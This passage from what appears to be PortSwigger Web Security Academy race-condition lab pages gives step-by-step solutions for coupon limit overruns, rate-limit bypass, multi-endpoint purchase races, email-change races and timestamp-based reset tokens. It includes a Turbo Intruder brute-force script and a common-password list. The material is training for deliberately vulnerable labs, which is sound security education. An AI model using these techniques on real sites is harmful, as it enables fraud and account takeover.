                                        session cookie, you can only access an empty cart. From this, you can infer
                                        that:
                                    </p>
                                    <ul>
                                        <li>
                                            The state of the cart is stored server-side in your session.
                                        </li>
                                        <li>
                                            Any operations on the cart are keyed on your session ID or the associated
                                            user ID.
                                        </li>
                                    </ul>
                                    <p>
                                        This indicates that there is potential for a collision.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Consider that there may be a race window between when you first apply a discount
                                        code and when the database is updated to reflect that you've done this already.
                                    </p>
                                </li>
                            </ol>
                            <h2 id="benchmark-the-behavior">
                                Benchmark the behavior
                            </h2>
                            <ol>
                                <li>
                                    <p>
                                        Make sure there is no discount code currently applied to your cart.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Send the request for applying the discount code (
                                        <code>
         POST /cart/coupon
        </code>
                                        ) to Repeater 20 times.
                                        <strong>
                                            Tip:
                                        </strong>
                                        You can do this quickly using the
                                        <code>
         Ctrl/Cmd + R
        </code>
                                        hotkey.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        In Repeater, add all 20 of these tabs to a new group. For details on how to do
                                        this, see
                                        <a
                                            href="https://portswigger.net/burp/documentation/desktop/tools/repeater/groups#creating-a-new-tab-group">
                                            Creating a new tab group
                                        </a>
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Send the group of requests in sequence, using separate connections to reduce the
                                        chance of interference. For details on how to do this, see
                                        <a
                                            href="https://portswigger.net/burp/documentation/desktop/tools/repeater/send-group#sending-requests-in-sequence">
                                            Sending requests in sequence
                                        </a>
                                        .
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Observe that the first response confirms that the discount was successfully
                                        applied, but the rest of the responses consistently reject the code with the
                                        same
                                        <strong>
                                            Coupon already applied
                                        </strong>
                                        message.
                                    </p>
                                </li>
                            </ol>
                            <h2 id="probe-for-clues">
                                Probe for clues
                            </h2>
                            <ol>
                                <li>
                                    <p>
                                        Remove the discount code from your cart.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        In Repeater, send the group of requests again, but this time in parallel,
                                        effectively applying the discount code multiple times at once. For details on
                                        how to do this, see
                                        <a
                                            href="https://portswigger.net/burp/documentation/desktop/tools/repeater/send-group#sending-requests-in-parallel">
                                            Sending requests in parallel
                                        </a>
                                        .
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Study the responses and observe that multiple requests received a response
                                        indicating that the code was successfully applied. If not, remove the code from
                                        your cart and repeat the attack.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        In the browser, refresh your cart and confirm that the 20% reduction has been
                                        applied more than once, resulting in a significantly cheaper order.
                                    </p>
                                </li>
                            </ol>
                            <h2 id="prove-the-concept">
                                Prove the concept
                            </h2>
                            <ol>
                                <li>
                                    <p>
                                        Remove the applied codes and the arbitrary item from your cart and add the
                                        leather jacket to your cart instead.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Resend the group of
                                        <code>
         POST /cart/coupon
        </code>
                                        requests in parallel.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Refresh the cart and check the order total:
                                    </p>
                                    <ul>
                                        <li>
                                            If the order total is still higher than your remaining store credit, remove
                                            the discount codes and repeat the attack.
                                        </li>
                                        <li>
                                            If the order total is less than your remaining store credit, purchase the
                                            jacket to solve the lab.
                                        </li>
                                    </ul>
                                </li>
                            </ol>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab: Bypassing rate limits via
                <a href="https://portswigger.net/web-security/race-conditions">
                    race conditions
                </a>
                (race-conditions)
            </h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-blue-small">
                        PRACTITIONER
                    </span>
                </p>
            </div>
            <p>
                This lab's login mechanism uses rate limiting to defend against brute-force attacks. However, this can
                be bypassed due to a race condition.
            </p>
            <p>
                To solve the lab:
            </p>
            <ol>
                <li>
                    Work out how to exploit the race condition to bypass the rate limit.
                </li>
                <li>
                    Successfully brute-force the password for the user
                    <code>
    carlos
   </code>
                    .
                </li>
                <li>
                    Log in and access the admin panel.
                </li>
                <li>
                    Delete the user
                    <code>
    carlos
   </code>
                    .
                </li>
            </ol>
            <p>
                You can log in to your account with the following credentials:
                <code>
   wiener:peter
  </code>
                .
            </p>
            <p>
                You should use the following list of potential passwords:
            </p>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Passwords
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <code class="code-scrollable">
      123123
abc123
football
monkey
letmein
shadow
master
666666
qwertyuiop
123321
mustang
123456
password
12345678
qwerty
123456789
12345
1234
111111
1234567
dragon
1234567890
michael
x654321
superman
1qaz2wsx
baseball
7777777
121212
000000
     </code>
                        </div>
                    </div>
                </details>
            </div>
            <div class="highlightedarea">
                <h4>
                    Note
                </h4>
                <ul>
                    <li>
                        Solving this lab requires Burp Suite 2023.9 or higher. You should also use the latest version of
                        the Turbo Intruder, which is available from the
                        <a href="https://portswigger.net/bappstore/9abaa233088242e8be252cd4ff534988">
                            BApp Store
                        </a>
                        .
                    </li>
                    <li>
                        You have a time limit of 15 mins. If you don't solve the lab within the time limit, you can
                        reset the lab. However, Carlos's password changes each time.
                    </li>
                </ul>
            </div>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/29118bf96eda68696455206d01f5dcd44e5dfd57fc51f8be70d4146bf8c49072?referrer=%2fweb-security%2frace-conditions%2flab-race-conditions-bypassing-rate-limits"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <h2 id="predict-a-potential-collision">
                                Predict a potential collision
                            </h2>
                            <ol>
                                <li>
                                    <p>
                                        Experiment with the login function by intentionally submitting incorrect
                                        passwords for your own account.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Observe that if you enter the incorrect password more than three times, you're
                                        temporarily blocked from making any more login attempts for the same account.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Try logging in using another arbitrary username and observe that you see the
                                        normal
                                        <code>
         Invalid username or password
        </code>
                                        message. This indicates that the rate limit is enforced per-username rather than
                                        per-session.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Deduce that the number of failed attempts per username must be stored
                                        server-side.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Consider that there may be a race window between:
                                    </p>
                                    <ul>
                                        <li>
                                            When you submit the login attempt.
                                        </li>
                                        <li>
                                            When the website increments the counter for the number of failed login
                                            attempts associated with a particular username.
                                        </li>
                                    </ul>
                                </li>
                            </ol>
                            <h2 id="benchmark-the-behavior">
                                Benchmark the behavior
                            </h2>
                            <ol>
                                <li>
                                    <p>
                                        From the proxy history, find a
                                        <code>
         POST /login
        </code>
                                        request containing an unsuccessful login attempt for your own account.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Send this request to Burp Repeater 20 times.
                                        <strong>
                                            Tip:
                                        </strong>
                                        You can do this quickly using the
                                        <code>
         Ctrl/Cmd + R
        </code>
                                        hotkey.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        In Repeater, add all 20 of these tabs to a new group. For details on how to do
                                        this, see
                                        <a
                                            href="https://portswigger.net/burp/documentation/desktop/tools/repeater/groups#creating-a-new-tab-group">
                                            Creating a new tab group
                                        </a>
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Send the group of requests in sequence, using separate connections to reduce the
                                        chance of interference. For details on how to do this, see
                                        <a
                                            href="https://portswigger.net/burp/documentation/desktop/tools/repeater/send-group#sending-requests-in-sequence">
                                            Sending requests in sequence
                                        </a>
                                        .
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Observe that after two more failed login attempts, you're temporarily locked out
                                        as expected.
                                    </p>
                                </li>
                            </ol>
                            <h2 id="probe-for-clues">
                                Probe for clues
                            </h2>
                            <ol>
                                <li>
                                    <p>
                                        Send the group of requests again, but this time in parallel. For details on how
                                        to do this, see
                                        <a
                                            href="https://portswigger.net/burp/documentation/desktop/tools/repeater/send-group#sending-requests-in-parallel">
                                            Sending requests in parallel
                                        </a>
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Study the responses. Notice that although you have triggered the account lock,
                                        more than three requests received the normal
                                        <code>
         Invalid username and password
        </code>
                                        response.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Infer that if you're quick enough, you're able to submit more than three login
                                        attempts before the account lock is triggered.
                                    </p>
                                </li>
                            </ol>
                            <h2 id="prove-the-concept">
                                Prove the concept
                            </h2>
                            <ol>
                                <li>
                                    <p>
                                        Still in Repeater, highlight the value of the
                                        <code>
         password
        </code>
                                        parameter in the
                                        <code>
         POST /login
        </code>
                                        request.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Right-click and select
                                        <strong>
                                            Extensions &gt; Turbo Intruder &gt; Send to turbo intruder
                                        </strong>
                                        .
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        In Turbo Intruder, in the request editor, notice that the value of the
                                        <code>
         password
        </code>
                                        parameter is automatically marked as a payload position with the
                                        <code>
         %s
        </code>
                                        placeholder.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Change the
                                        <code>
         username
        </code>
                                        parameter to
                                        <code>
         carlos
        </code>
                                        .
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        From the drop-down menu, select the
                                        <code>
         examples/race-single-packet-attack.py
        </code>
                                        template.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        In the Python editor, edit the template so that your attack queues the request
                                        once using each of the candidate passwords. For simplicity, you can copy the
                                        following example:
                                    </p>
                                    <code class="code-scrollable">
        def queueRequests(target, wordlists):
        <span class="grey">
         # as the target supports HTTP/2, use engine=Engine.BURP2 and concurrentConnections=1 for a single-packet attack
        </span>
        engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           engine=Engine.BURP2
                           )
        <span class="grey">
         # assign the list of candidate passwords from your clipboard
        </span>
        passwords = wordlists.clipboard
        <span class="grey">
         # queue a login request using each password from the wordlist
        </span>
        <span class="grey">
         # the 'gate' argument withholds the final part of each request until engine.openGate() is invoked
        </span>
        for password in passwords:
        engine.queue(target.req, password, gate='1')
        <span class="grey">
         # once every request has been queued
        </span>
        <span class="grey">
         # invoke engine.openGate() to send all requests in the given gate simultaneously
        </span>
        engine.openGate('1')


def handleResponse(req, interesting):
    table.add(req)
       </code>
                                </li>
                                <li>
                                    <p>
                                        Note that we're assigning the password list from the clipboard by referencing
                                        <code>
         wordlists.clipboard
        </code>
                                        . Copy the list of candidate passwords to your clipboard.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Launch the attack.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Study the responses.
                                    </p>
                                    <ul>
                                        <li>
                                            If you have no successful logins, wait for the account lock to reset and
                                            then repeat the attack. You might want to remove any passwords from the list
                                            that you know are incorrect.
                                        </li>
                                        <li>
                                            If you get a 302 response, notice that this login appears to be successful.
                                            Make a note of the corresponding password from the
                                            <strong>
                                                Payload
                                            </strong>
                                            column.
                                        </li>
                                    </ul>
                                </li>
                                <li>
                                    <p>
                                        Wait for the account lock to reset, then log in as
                                        <code>
         carlos
        </code>
                                        using the identified password.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Access the admin panel and delete the user
                                        <code>
         carlos
        </code>
                                        to solve the lab.
                                    </p>
                                </li>
                            </ol>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab: Multi-endpoint
                <a href="https://portswigger.net/web-security/race-conditions">
                    race conditions
                </a>
                (race-conditions)
            </h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-blue-small">
                        PRACTITIONER
                    </span>
                </p>
            </div>
            <p>
                This lab's purchasing flow contains a race condition that enables you to purchase items for an
                unintended price.
            </p>
            <p>
                To solve the lab, successfully purchase a
                <strong>
                    Lightweight L33t Leather Jacket
                </strong>
                .
            </p>
            <p>
                You can log into your account with the following credentials:
                <code>
   wiener:peter
  </code>
                .
            </p>
            <div class="highlightedarea">
                <h4>
                    Note
                </h4>
                <p>
                    Solving this lab requires Burp Suite 2023.9 or higher.
                </p>
            </div>
            <div class="highlightedarea">
                <h4>
                    Tip
                </h4>
                <p>
                    When experimenting, we recommend purchasing the gift card as you can later redeem this to avoid
                    running out of store credit.
                </p>
            </div>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/167394bd4478dd05f683affd8d0bf579e9daf428cb0808509ba8f76b1a12c046?referrer=%2fweb-security%2frace-conditions%2flab-race-conditions-multi-endpoint"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <h2 id="predict-a-potential-collision">
                                Predict a potential collision
                            </h2>
                            <ol>
                                <li>
                                    <p>
                                        Log in and purchase a gift card so you can study the purchasing flow.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Consider that the shopping cart mechanism and, in particular, the restrictions
                                        that determine what you are allowed to order, are worth trying to bypass.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        From the proxy history, identify all endpoints that enable you to interact with
                                        the cart. For example, a
                                        <code>
         POST /cart
        </code>
                                        request adds items to the cart and a
                                        <code>
         POST /cart/checkout
        </code>
                                        request submits your order.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Add another gift card to your cart, then send the
                                        <code>
         GET /cart
        </code>
                                        request to Burp Repeater.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        In Repeater, try sending the
                                        <code>
         GET /cart
        </code>
                                        request both with and without your session cookie. Confirm that without the
                                        session cookie, you can only access an empty cart. From this, you can infer
                                        that:
                                    </p>
                                    <ul>
                                        <li>
                                            The state of the cart is stored server-side in your session.
                                        </li>
                                        <li>
                                            Any operations on the cart are keyed on your session ID or the associated
                                            user ID.
                                        </li>
                                    </ul>
                                    <p>
                                        This indicates that there is potential for a collision.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Notice that submitting and receiving confirmation of a successful order takes
                                        place over a single request/response cycle.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Consider that there may be a race window between when your order is validated
                                        and when it is confirmed. This could enable you to add more items to the order
                                        after the server checks whether you have enough store credit.
                                    </p>
                                </li>
                            </ol>
                            <h2 id="benchmark-the-behavior">
                                Benchmark the behavior
                            </h2>
                            <ol>
                                <li>
                                    <p>
                                        Send both the
                                        <code>
         POST /cart
        </code>
                                        and
                                        <code>
         POST /cart/checkout
        </code>
                                        request to Burp Repeater.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        In Repeater, add the two tabs to a new group. For details on how to do this, see
                                        <a
                                            href="https://portswigger.net/burp/documentation/desktop/tools/repeater/groups#creating-a-new-tab-group">
                                            Creating a new tab group
                                        </a>
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Send the two requests in sequence over a single connection a few times. Notice
                                        from the response times that the first request consistently takes significantly
                                        longer than the second one. For details on how to do this, see
                                        <a
                                            href="https://portswigger.net/burp/documentation/desktop/tools/repeater/send-group#sending-requests-in-sequence">
                                            Sending requests in sequence
                                        </a>
                                        .
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Add a
                                        <code>
         GET
        </code>
                                        request for the homepage to the start of your tab group.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Send all three requests in sequence over a single connection. Observe that the
                                        first request still takes longer, but by "warming" the connection in this way,
                                        the second and third requests are now completed within a much smaller window.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Deduce that this delay is caused by the back-end network architecture rather
                                        than the respective processing time of the each endpoint. Therefore, it is not
                                        likely to interfere with your attack.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Remove the
                                        <code>
         GET
        </code>
                                        request for the homepage from your tab group.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Make sure you have a single gift card in your cart.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        In Repeater, modify the
                                        <code>
         POST /cart
        </code>
                                        request in your tab group so that the
                                        <code>
         productId
        </code>
                                        parameter is set to
                                        <code>
         1
        </code>
                                        , that is, the ID of the
                                        <strong>
                                            Lightweight L33t Leather Jacket
                                        </strong>
                                        .
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Send the requests in sequence again.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Observe that the order is rejected due to insufficient funds, as you would
                                        expect.
                                    </p>
                                </li>
                            </ol>
                            <h2 id="prove-the-concept">
                                Prove the concept
                            </h2>
                            <ol>
                                <li>
                                    <p>
                                        Remove the jacket from your cart and add another gift card.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        In Repeater, try sending the requests again, but this time in parallel. For
                                        details on how to do this, see
                                        <a
                                            href="https://portswigger.net/burp/documentation/desktop/tools/repeater/send-group#sending-requests-in-parallel">
                                            Sending requests in parallel
                                        </a>
                                        .
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Look at the response to the
                                        <code>
         POST /cart/checkout
        </code>
                                        request:
                                    </p>
                                    <ul>
                                        <li>
                                            If you received the same "insufficient funds" response, remove the jacket
                                            from your cart and repeat the attack. This may take several attempts.
                                        </li>
                                        <li>
                                            If you received a 200 response, check whether you successfully purchased the
                                            leather jacket. If so, the lab is solved.
                                        </li>
                                    </ul>
                                </li>
                            </ol>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab: Single-endpoint
                <a href="https://portswigger.net/web-security/race-conditions">
                    race conditions
                </a>
                (race-conditions)
            </h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-blue-small">
                        PRACTITIONER
                    </span>
                </p>
            </div>
            <p>
                This lab's email change feature contains a race condition that enables you to associate an arbitrary
                email address with your account.
            </p>
            <p>
                Someone with the address
                <code>
   carlos@ginandjuice.shop
  </code>
                has a pending invite to be an administrator for the site, but they have not yet created an account.
                Therefore, any user who successfully claims this address will automatically inherit admin privileges.
            </p>
            <p>
                To solve the lab:
            </p>
            <ol>
                <li>
                    Identify a race condition that lets you claim an arbitrary email address.
                </li>
                <li>
                    Change your email address to
                    <code>
    carlos@ginandjuice.shop
   </code>
                    .
                </li>
                <li>
                    Access the admin panel.
                </li>
                <li>
                    Delete the user
                    <code>
    carlos
   </code>
                </li>
            </ol>
            <p>
                You can log in to your own account with the following credentials:
                <code>
   wiener:peter
  </code>
                .
            </p>
            <p>
                You also have access to an email client, where you can view all emails sent to
                <code>
   @exploit-&lt;YOUR-EXPLOIT-SERVER-ID&gt;.exploit-server.net
  </code>
                addresses.
            </p>
            <div class="highlightedarea">
                <h4>
                    Note
                </h4>
                <p>
                    Solving this lab requires Burp Suite 2023.9 or higher.
                </p>
            </div>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/71c6fcf0f90655384236e0540795d7a265f823ea1258f995b615cf351fe32a56?referrer=%2fweb-security%2frace-conditions%2flab-race-conditions-single-endpoint"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <h2 id="predict-a-potential-collision">
                                Predict a potential collision
                            </h2>
                            <ol>
                                <li>
                                    <p>
                                        Log in and attempt to change your email to
                                        <code>
         anything@exploit-&lt;YOUR-EXPLOIT-SERVER-ID&gt;.exploit-server.net
        </code>
                                        . Observe that a confirmation email is sent to your intended new address, and
                                        you're prompted to click a link containing a unique token to confirm the change.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Complete the process and confirm that your email address has been updated on
                                        your account page.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Try submitting two different
                                        <code>
         @exploit-&lt;YOUR-EXPLOIT-SERVER-ID&gt;.exploit-server.net
        </code>
                                        email addresses in succession, then go to the email client.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Notice that if you try to use the first confirmation link you received, this is
                                        no longer valid. From this, you can infer that the website only stores one
                                        pending email address at a time. As submitting a new email address edits this
                                        entry in the database rather than appending to it, there is potential for a
                                        collision.
                                    </p>
                                </li>
                            </ol>
                            <h2 id="benchmark-the-behavior">
                                Benchmark the behavior
                            </h2>
                            <ol>
                                <li>
                                    <p>
                                        Send the
                                        <code>
         POST /my-account/change-email
        </code>
                                        request to Repeater 20 times.
                                        <strong>
                                            Tip:
                                        </strong>
                                        You can do this quickly using the
                                        <code>
         Ctrl/Cmd + R
        </code>
                                        hotkey.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        In Repeater, add all 20 tabs to a new group. For details on how to do this, see
                                        <a
                                            href="https://portswigger.net/burp/documentation/desktop/tools/repeater/groups#creating-a-new-tab-group">
                                            Creating a new tab group
                                        </a>
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        In each tab, modify the first part of the email address so that it is unique to
                                        each request, for example,
                                        <code>
         test1@exploit-&lt;YOUR-EXPLOIT-SERVER-ID&gt;.exploit-server.net, test2@..., test3@...
        </code>
                                        and so on.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Send the group of requests in sequence over separate connections. For details on
                                        how to do this, see
                                        <a
                                            href="https://portswigger.net/burp/documentation/desktop/tools/repeater/send-group#sending-requests-in-sequence">
                                            Sending requests in sequence
                                        </a>
                                        .
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Go back to the email client and observe that you have received a single
                                        confirmation email for each of the email change requests.
                                    </p>
                                </li>
                            </ol>
                            <h2 id="probe-for-clues">
                                Probe for clues
                            </h2>
                            <ol>
                                <li>
                                    <p>
                                        In Repeater, send the group of requests again, but this time in parallel,
                                        effectively attempting to change the pending email address to multiple different
                                        values at the same time. For details on how to do this, see
                                        <a
                                            href="https://portswigger.net/burp/documentation/desktop/tools/repeater/send-group#sending-requests-in-parallel">
                                            Sending requests in parallel
                                        </a>
                                        .
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Go to the email client and study the new set of confirmation emails you've
                                        received. Notice that, this time, the recipient address doesn't always match the
                                        pending new email address.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Consider that there may be a race window between when the website:
                                    </p>
                                    <ol>
                                        <li>
                                            Kicks off a task that eventually sends an email to the provided address.
                                        </li>
                                        <li>
                                            Retrieves data from the database and uses this to render the email template.
                                        </li>
                                    </ol>
                                </li>
                                <li>
                                    <p>
                                        Deduce that when a parallel request changes the pending email address stored in
                                        the database during this window, this results in confirmation emails being sent
                                        to the wrong address.
                                    </p>
                                </li>
                            </ol>
                            <h2 id="prove-the-concept">
                                Prove the concept
                            </h2>
                            <ol>
                                <li>
                                    <p>
                                        In Repeater, create a new group containing two copies of the
                                        <code>
         POST /my-account/change-email
        </code>
                                        request.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Change the
                                        <code>
         email
        </code>
                                        parameter of one request to
                                        <code>
         anything@exploit-&lt;YOUR-EXPLOIT-SERVER-ID&gt;.exploit-server.net
        </code>
                                        .
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Change the
                                        <code>
         email
        </code>
                                        parameter of the other request to
                                        <code>
         carlos@ginandjuice.shop
        </code>
                                        .
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Send the requests in parallel.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Check your inbox:
                                    </p>
                                    <ul>
                                        <li>
                                            If you received a confirmation email in which the address in the body
                                            matches your own address, resend the requests in parallel and try again.
                                        </li>
                                        <li>
                                            If you received a confirmation email in which the address in the body is
                                            <code>
          carlos@ginandjuice.shop
         </code>
                                            , click the confirmation link to update your address accordingly.
                                        </li>
                                    </ul>
                                </li>
                                <li>
                                    <p>
                                        Go to your account page and notice that you now see a link for accessing the
                                        admin panel.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Visit the admin panel and delete the user
                                        <code>
         carlos
        </code>
                                        to solve the lab.
                                    </p>
                                </li>
                            </ol>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab: Exploiting time-sensitive vulnerabilities
                (race-conditions)</h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-blue-small">
                        PRACTITIONER
                    </span>
                </p>
            </div>
            <p>
                This lab contains a password reset mechanism. Although it doesn't contain a race condition, you can
                exploit the mechanism's broken cryptography by sending carefully timed requests.
            </p>
            <p>
                To solve the lab:
            </p>
            <ol>
                <li>
                    Identify the vulnerability in the way the website generates password reset tokens.
                </li>
                <li>
                    Obtain a valid password reset token for the user
                    <code>
    carlos
   </code>
                    .
                </li>
                <li>
                    Log in as
                    <code>
    carlos
   </code>
                    .
                </li>
                <li>
                    Access the admin panel and delete the user
                    <code>
    carlos
   </code>
                    .
                </li>
            </ol>
            <p>
                You can log into your account with the following credentials:
                <code>
   wiener:peter
  </code>
                .
            </p>
            <div class="highlightedarea">
                <h4>
                    Note
                </h4>
                <p>
                    Solving this lab requires Burp Suite 2023.9 or higher.
                </p>
            </div>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/78911fb5a8391a1df80981ae967ce751b903dcbed81805da32763871a68ac88a?referrer=%2fweb-security%2frace-conditions%2flab-race-conditions-exploiting-time-sensitive-vulnerabilities"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <h2 id="study-the-behavior">
                                Study the behavior
                            </h2>
                            <ol>
                                <li>
                                    <p>
                                        Study the password reset process by submitting a password reset for your own
                                        account and observe that you're sent an email containing a reset link. The query
                                        string of this link includes your username and a token.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Send the
                                        <code>
         POST /forgot-password
        </code>
                                        request to Burp Repeater.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        In Repeater, send the request a few times, then check your inbox again.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Observe that every reset request results in a link with a different token.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Consider the following:
                                    </p>
                                    <ul>
                                        <li>
                                            The token is of a consistent length. This suggests that it's either a
                                            randomly generated string with a fixed number of characters, or could be a
                                            hash of some unknown data, which may be predictable.
                                        </li>
                                        <li>
                                            The fact that the token is different each time indicates that, if it is in
                                            fact a hash digest, it must contain some kind of internal state, such as an
                                            RNG, a counter, or a timestamp.
                                        </li>
                                    </ul>
                                </li>
                                <li>
                                    <p>
                                        Duplicate the Repeater tab and add both tabs to a new group. For details on how
                                        to do this, see
                                        <a
                                            href="https://portswigger.net/burp/documentation/desktop/tools/repeater/groups#creating-a-new-tab-group">
                                            Creating a new tab group
                                        </a>
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Send the pair of reset requests in parallel a few times. For details on how to
                                        do this, see
                                        <a
                                            href="https://portswigger.net/burp/documentation/desktop/tools/repeater/send-group#sending-requests-in-parallel">
                                            Sending requests in parallel
                                        </a>
                                        .
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Observe that there is still a significant delay between each response and that
                                        you still get a different token in each confirmation email. Infer that your
                                        requests are still being processed in sequence rather than concurrently.
                                    </p>
                                </li>
                            </ol>
                            <h2 id="bypass-the-per-session-locking-restriction">
                                Bypass the per-session locking restriction
                            </h2>
                            <ol>
                                <li>
                                    <p>
                                        Notice that your session cookie suggests that the website uses a PHP back-end.
                                        This could mean that the server only processes one request at a time per
                                        session.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Send the
                                        <code>
         GET /forgot-password
        </code>
                                        request to Burp Repeater, remove the session cookie from the request, then send
                                        it.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        From the response, copy the newly issued session cookie and
                                        <a href="https://portswigger.net/web-security/csrf">
                                            CSRF
                                        </a>
                                        token and use them to replace the respective values in one of the two
                                        <code>
         POST /forgot-password
        </code>
                                        requests. You now have a pair of password reset requests from two different
                                        sessions.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Send the two
                                        <code>
         POST
        </code>
                                        requests in parallel a few times and observe that the processing times are now
                                        much more closely aligned, and sometimes identical.
                                    </p>
                                </li>
                            </ol>
                            <h2 id="confirm-the-vulnerability">
                                Confirm the vulnerability
                            </h2>
                            <ol>
                                <li>
                                    <p>
                                        Go back to your inbox and notice that when the response times match for the pair
                                        of reset requests, this results in two confirmation emails that use an identical
                                        token. This confirms that a timestamp must be one of the inputs for the hash.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Consider that this also means the token would be predictable if you knew the
                                        other inputs for the hash function.
                                    </p>
                                </li>
